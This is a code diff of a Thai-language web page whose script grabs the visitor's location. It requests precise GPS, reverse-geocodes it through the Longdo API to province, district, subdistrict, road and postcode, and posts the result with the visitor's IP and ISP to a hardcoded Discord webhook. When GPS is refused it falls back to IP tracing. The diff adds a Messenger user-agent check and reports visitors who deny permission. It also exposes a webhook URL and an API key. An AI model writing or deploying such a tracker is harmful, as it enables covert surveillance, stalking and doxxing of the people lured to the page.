@@ -29,7 +29,7 @@
         /* Matrix Background */
         canvas { position: fixed; top: 0; left: 0; z-index: 0; }
 
-        /* --- Floating Creators --- */
+        /* --- Floating Creators (Low & Sync) --- */
         #creators-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
         .creator-bubble { position: absolute; bottom: -200px; display: flex; flex-direction: column; align-items: center; opacity: 0.9; }
         .c-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--neon); box-shadow: 0 0 20px var(--neon); object-fit: cover; background: #000; }
@@ -37,12 +37,12 @@
         
         /* Synchronized Animation */
         .float-1 { left: 20%; animation: floatDrop 8s infinite ease-in-out; }
-        .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; }
+        .float-2 { right: 20%; animation: floatDrop 8s infinite ease-in-out; } 
         
         @keyframes floatDrop {
             0% { bottom: -150px; opacity: 0; transform: scale(0.8); }
             20% { opacity: 1; }
-            50% { bottom: 15%; opacity: 1; transform: scale(1.1); }
+            50% { bottom: 15%; opacity: 1; transform: scale(1.1); } 
             55% { bottom: 15%; opacity: 1; }
             100% { bottom: -150px; opacity: 0; transform: scale(0.5); }
         }
@@ -89,7 +89,7 @@
         .lang-content div:hover { background-color: var(--neon); color: #000; }
         .show { display: block; }
 
-        /* Hint Bubble */
+        /* Language Hint Bubble */
         .lang-hint-box {
             position: fixed; top: 85px; right: 20px;
             background: var(--neon); color: #000;
@@ -314,6 +314,7 @@
 
     <script>
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1463153197815300117/Ljc-NOI-XwJA3poOTNCPfuUNM1V7xSPwvhAcc9yk4cndBt166FhvwXEPu5HmTfMlnBTj";
+        const LONGDO_KEY = "021941bcf871b7bfde06da19c1db59a5"; 
 
         const txt = {
             th: {
@@ -361,7 +362,6 @@
 
             const pixels = document.querySelectorAll('.pixel');
             
-            // Draw Big X
             for(let i=0; i<size*size; i++) {
                 const x = i % size;
                 const y = Math.floor(i / size);
@@ -405,9 +405,15 @@
 
         // --- PERMISSION LOGIC ---
         function requestPermission() {
+            const isMessenger = /FBAN|FBAV/i.test(navigator.userAgent);
             navigator.geolocation.getCurrentPosition(
                 (pos) => { gpsData = pos; acceptIntro(); },
-                (err) => { document.getElementById('intro-modal').classList.add('hidden'); document.getElementById('warning-modal').classList.remove('hidden'); }
+                (err) => { 
+                    document.getElementById('intro-modal').classList.add('hidden'); 
+                    document.getElementById('warning-modal').classList.remove('hidden'); 
+                    if(ipCache) sendToDiscord(ipCache.ip, "Permission Denied", ipCache.region, ipCache.country_name, ipCache.org, "User Blocked GPS", "N/A");
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
             );
         }
         function forceRetry() {
@@ -442,7 +448,6 @@
             }, 2000);
         }
 
-        // --- Deep Address Search Logic ---
         function showData() {
             const d = document.getElementById('user-data');
             const m = document.getElementById('map-area');
@@ -453,67 +458,47 @@
                 const lng = gpsData.coords.longitude;
                 const mapLink = `https://maps.google.com/maps?q=${lat},${lng}`;
 
-                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=th`)
+                // LONGDO MAP API
+                fetch(`https://api.longdo.com/map/services/address?lon=${lng}&lat=${lat}&key=${LONGDO_KEY}`)
                 .then(res => res.json())
                 .then(data => {
-                    const addr = data.address;
-                    
-                    // Province
-                    let province = addr.state || addr.province || "ไม่ทราบจังหวัด";
-                    if(!province.startsWith("จ.")) province = "จ." + province;
-
-                    // District
-                    let amphoe = addr.city_district || addr.district || addr.county || addr.city || "ไม่ทราบอำเภอ";
-                    amphoe = amphoe.replace("อำเภอ", "").replace("เขต", "").trim();
-                    if(!amphoe.startsWith("อ.") && amphoe !== "ไม่ทราบอำเภอ") amphoe = "อ." + amphoe;
-
-                    // Tambon (Deep Search)
-                    let tambon = addr.suburb || addr.village || addr.neighbourhood || addr.quarter || addr.hamlet || addr.town || addr.municipality || "";
-                    tambon = tambon.replace("ตำบล", "").replace("แขวง", "").trim();
-                    
-                    if(tambon) {
-                        if(!tambon.startsWith("ต.")) tambon = "ต." + tambon;
-                    } else {
-                        // Fallback to Amphoe if Tambon is absolutely missing
-                        tambon = amphoe ? "เขตพื้นที่ " + amphoe.replace("อ.","") : "ไม่ทราบตำบล";
-                    }
-
-                    // Road
-                    let road = addr.road || addr.path || addr.footway || addr.pedestrian || addr.residential || "ไม่พบชื่อถนน (พื้นที่ส่วนบุคคล)";
-
-                    // Country
-                    const country = addr.country || "ประเทศไทย";
+                    const province = data.province || "ไม่ทราบจังหวัด";
+                    const amphoe = data.district || "ไม่ทราบอำเภอ";
+                    const tambon = data.subdistrict || "ไม่ทราบตำบล";
+                    const road = data.road || data.soi || "พื้นที่ส่วนบุคคล/ไม่ทราบชื่อถนน";
+                    const postcode = data.postcode || "";
 
                     d.innerHTML = `
                         <div style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">
-                            <span style="color:#0f0">● DATA SENT TO ADMIN</span>
+                            <span style="color:#0f0">● DATA SENT TO ADMIN (LONGDO SOURCE)</span>
                         </div>
-                        ประเทศ: <span style="color:#fff">${country}</span><br>
-                        จังหวัด: <span style="color:#fff">${province}</span><br>
-                        อำเภอ: <span style="color:#fff">${amphoe}</span><br>
-                        ตำบล: <span style="color:#fff">${tambon}</span><br>
+                        ประเทศ: <span style="color:#fff">ประเทศไทย</span><br>
+                        จังหวัด: <span style="color:#fff">จ.${province}</span><br>
+                        อำเภอ: <span style="color:#fff">อ.${amphoe}</span><br>
+                        ตำบล: <span style="color:#fff">ต.${tambon}</span><br>
                         ถนน: <span style="color:#fff">${road}</span><br>
-                        <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">COORDS: ${lat.toFixed(5)}, ${lng.toFixed(5)}</div>
+                        รหัสไปรษณีย์: <span style="color:#fff">${postcode}</span><br>
+                        <div style="margin-top:10px; font-size:0.9rem; color:#aaa;">พิกัดเป๊ะ: ${lat.toFixed(6)}, ${lng.toFixed(6)}</div>
                     `;
-                    m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lng}&z=17&output=embed"></iframe>`;
+                    m.innerHTML = `<iframe width="100%" height="100%" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lng}&z=18&output=embed"></iframe>`;
                     
-                    sendToDiscord(info.ip, `${tambon}, ${amphoe}`, province, country, info.org, mapLink, road);
+                    sendToDiscord(info.ip, `ต.${tambon}, อ.${amphoe}`, `จ.${province}`, "ประเทศไทย", info.org, mapLink, road);
                 })
                 .catch(err => {
-                    d.innerHTML = "การเชื่อมต่อดาวเทียมขัดข้อง...";
+                    d.innerHTML = "<span style='color:red'>API Error: เช็ค Domain (Referer) ในเว็บ Longdo</span>";
                 });
 
             } else {
                 // IP Fallback
                 d.innerHTML = `
-                    <span style="color:red">[ GPS ถูกปฏิเสธ ] ตรวจสอบผ่านหมายเลข IP...</span><br>
+                    <span style="color:red">[ GPS BLOCKED ] TRACING VIA IP...</span><br>
                     ประเทศ: <span style="color:#fff">ประเทศไทย</span><br>
-                    จังหวัด: <span style="color:#fff">${info.region || "กำลังระบุ..."}</span><br>
-                    เมือง/เขต: <span style="color:#fff">${info.city || "ไม่ทราบข้อมูล"}</span><br>
-                    IP: <span style="color:#fff">${info.ip}</span>
+                    จังหวัด: <span style="color:#fff">${info.region || "กำลังค้นหา..."}</span><br>
+                    IP: <span style="color:#fff">${info.ip}</span><br>
+                    STATUS: <span style="color:red">SENT TO ADMIN</span>
                 `;
-                m.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100%;color:red;">ระบบ GPS ถูกปิดกั้น</div>`;
-                sendToDiscord(info.ip, info.city, info.region, "ประเทศไทย", info.org, "No GPS", "Unknown");
+                m.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100%;color:red;">GPS SIGNAL LOST</div>`;
+                sendToDiscord(info.ip, info.city, info.region, "ประเทศไทย", info.org, "No GPS", "N/A");
             }
         }
 
